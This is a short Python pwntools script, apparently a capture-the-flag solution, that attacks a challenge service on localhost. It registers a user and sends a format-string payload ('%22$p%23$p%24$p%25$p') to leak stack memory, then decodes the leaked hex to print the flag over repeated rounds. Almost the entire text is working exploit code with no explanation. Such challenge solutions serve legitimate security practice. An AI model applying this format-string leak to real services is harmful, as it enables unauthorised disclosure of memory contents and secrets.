from pwn import *
from time import *

def decoding(fir):
    return (bytes.fromhex(fir.decode())[::-1]).decode()

#p = process('./chall')
p = remote('127.0.0.1', 7272)

pon = set()

p.sendlineafter(b'> ', b'2')
p.sendlineafter(b'Enter name (login): ', b'azod')
p.sendlineafter(b'Enter password: ', b'azod')

p.sendlineafter(b'> ', b'4')
p.sendline(b'3')
p.sendline(b'%22$p%23$p%24$p%25$p')

def get_flag():
    p.sendlineafter(b'> ', b'6')
    p.recvuntil(b'You lost!', timeout=4)
    p.recvline()
    pon = p.recvline()[:-1].split(b'0x')[1:]
    [print(decoding(i), end='') for i in pon]
    print('')

for i in range(1, 15):
    sleep(1)
    get_flag()




